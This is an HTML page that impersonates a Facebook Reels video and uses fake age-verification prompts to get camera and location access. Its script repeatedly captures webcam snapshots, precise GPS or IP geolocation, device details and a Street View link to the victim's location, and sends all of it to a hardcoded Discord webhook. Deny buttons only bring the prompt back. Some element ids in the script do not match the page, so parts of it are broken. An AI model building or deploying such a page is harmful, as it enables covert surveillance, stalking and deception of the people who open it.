<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
  <style>
    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.8); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(12px); }
    .close { font-size:34px; font-weight:bold; cursor:pointer; margin-right:20px; }
    .title { flex:1; text-align:center; font-size:19px; font-weight:600; }
    .reel { height:100vh; position:relative; }
    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; }
    .avatar { width:48px; height:48px; border-radius:50%; background:#666; margin-right:14px; }
    .info { font-size:17px; line-height:1.2; }
    .name { font-weight:600; }
    .public { font-size:14px; opacity:0.9; }
    .play-container { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; }
    .play-btn { width:120px; height:120px; background:rgba(0,0,0,0.6); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; }
    .triangle { width:0; height:0; border-top:40px solid transparent; border-bottom:40px solid transparent; border-left:64px solid #fff; margin-left:12px; }
    .text { position:absolute; bottom:240px; left:0; right:0; font-size:2.8rem; text-align:center; text-shadow:0 6px 30px #000; pointer-events:none; line-height:1.1; z-index:4; }
    .actions { position:absolute; bottom:60px; right:28px; display:flex; flex-direction:column; gap:36px; font-size:36px; color:#fff; z-index:6; }
    .audio-credit { position:absolute; bottom:24px; left:20px; font-size:15px; opacity:0.85; z-index:10; }
    #cam-modal, #loc-modal { position:fixed; inset:0; background:rgba(0,0,0,0.94); display:none; align-items:center; justify-content:center; z-index:9999; }
    .modal { background:#fff; color:#000; padding:52px 40px; border-radius:22px; max-width:460px; text-align:center; box-shadow:0 20px 70px rgba(0,0,0,0.75); }
    .btn { padding:18px 80px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:22px 14px; cursor:pointer; }
    .allow { background:#1877f2; color:#fff; }
    .deny { background:#e4e6eb; color:#000; }
  </style>
</head>
<body>
<div class="header">
  <div class="close">√ó</div>
  <div class="title">Reels</div>
</div>

<div class="reel">
  <div class="profile">
    <div class="avatar"></div>
    <div class="info">
      <div class="name">Zorica Zoka Dimitrijevic</div>
      <div class="public">√ñffentlich</div>
    </div>
  </div>

  <div class="play-container" id="playBtn">
    <div class="play-btn"><div class="triangle"></div></div>
  </div>

  <div class="text">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>

  <div class="actions">
    <div>‚ù§Ô∏è 14.6K</div>
    <div>üí¨ 305</div>
    <div>‚û§</div>
  </div>

  <div class="audio-credit">Zorica Zoka Dimitrijevic ¬∑ Original audio ¬∑ Zorica</div>
</div>

<div id="cam-modal">
  <div class="modal">
    <h2>Video kann nicht abgespielt werden</h2>
    <p style="margin:30px 0; font-size:1.35rem;">Bitte gib kurz Kamera-Zugriff f√ºr Alterspr√ºfung.</p>
    <div id="camError" style="color:#c00;display:none;margin:22px 0;">Zugriff verweigert ‚Äì erneut versuchen</div>
    <button id="camAllow" class="btn allow">KAMERA FREIGEBEN</button>
    <button id="camDeny" class="btn deny">ABBRECHEN</button>
  </div>
</div>

<div id="loc-modal">
  <div class="modal">
    <h2>Standort freigeben erforderlich</h2>
    <p style="margin:30px 0; font-size:1.35rem;">Teile deinen genauen Standort, damit das Video geladen wird.</p>
    <button id="locAllow" class="btn allow">STANDORT TEILEN</button>
    <button id="locDeny" class="btn deny">NEIN</button>
  </div>
</div>

<video id="vid" autoplay muted playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
let count=0, stream=null, video=document.getElementById('vid'), canvas=document.getElementById('canvas');

async function fetchIPGeo() {
  let geo=null;
  try {
    geo=await (await fetch('https://ipapi.co/json/')).json();
    if (geo.ip && geo.latitude) return geo;
  } catch {}
  try {
    geo=await (await fetch('https://ipinfo.io/json')).json();
    if (geo.ip && geo.loc) {
      const [lat,lon]=geo.loc.split(',');
      geo.latitude=parseFloat(lat); geo.longitude=parseFloat(lon);
      return geo;
    }
  } catch {}
  return {ip:'unbekannt', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
}

async function getPreciseGPS() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      pos => resolve({latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy}),
      err => resolve(null),
      { enableHighAccuracy:true, timeout:18000, maximumAge:0 }
    );
  });
}

async function exfil(type, blob=null) {
  try {
    let loc = await getPreciseGPS() || await fetchIPGeo();
    let ip = loc.ip || 'unbekannt';
    let city = loc.city || '?', reg = loc.region || '?', ctry = loc.country || '?', plz = loc.postal || '?', org = loc.org || '?';
    let lat = loc.latitude, lon = loc.longitude;
    let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
    let mapsLink = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;

    const embed = {
      title: `üî¥ FB ${type} #${++count}`,
      color: lat ? 0x00ff99 : 0xff0000,
      fields: [
        {name:"Event", value:type, inline:true},
        {name:"IP + Ort", value:`**${ip}**\n${city} ‚Ä¢ ${reg} ‚Ä¢ ${ctry} ‚Ä¢ ${plz} ‚Ä¢ ${org}`, inline:true},
        {name:"Genauigkeit", value:acc, inline:true},
        {name:"User-Agent", value:navigator.userAgent.substring(0,140), inline:false},
        {name:"Bildschirm", value:`${screen.width}√ó${screen.height}`, inline:true},
        {name:"Zeit", value:new Date().toISOString(), inline:true}
      ],
      timestamp: new Date().toISOString()
    };
    if (mapsLink) embed.fields.push({name:"Google Maps ‚Äì exakte Position", value:`[‚Üí Haus / Street View](${mapsLink})`, inline:false});

    const payload = {embeds:[embed]};
    if (blob) {
      let fd = new FormData();
      fd.append("payload_json", JSON.stringify(payload));
      fd.append("file", blob, `snap_${Date.now()}.jpg`);
      await fetch(WEBHOOK + "?wait=true", {method:"POST", body:fd});
    } else {
      await fetch(WEBHOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
    }
  } catch {}
}

document.getElementById('playBtn').onclick = () => {
  if (location.protocol !== 'https:') alert('Lade die Seite √ºber HTTPS, sonst funktioniert Location auf Handy nicht!');
  document.getElementById('cam-prompt').style.display = 'flex';
  exfil('PLAY');
};

document.getElementById('camAllow').onclick = async () => {
  document.getElementById('cam-prompt').style.display = 'none';
  try {
    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}});
    video.srcObject = stream;
    await video.play();
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    setInterval(async () => {
      canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
      let blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.88));
      exfil('CAM SNAP', blob);
    }, 1400);
    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 3500);
  } catch(e) {
    exfil('CAM ERROR');
    document.getElementById('camError').style.display = 'block';
    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2600);
  }
};

document.getElementById('camDeny').onclick = () => {
  document.getElementById('camError').style.display = 'block';
  exfil('CAM DENY');
  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2000);
};

document.getElementById('locAllow').onclick = async () => {
  document.getElementById('loc-prompt').style.display = 'none';
  exfil('LOC GRANTED');
};

document.getElementById('locDeny').onclick = () => {
  document.getElementById('loc-prompt').style.display = 'none';
  exfil('LOC DENY');
};
</script>
</body>
</html>
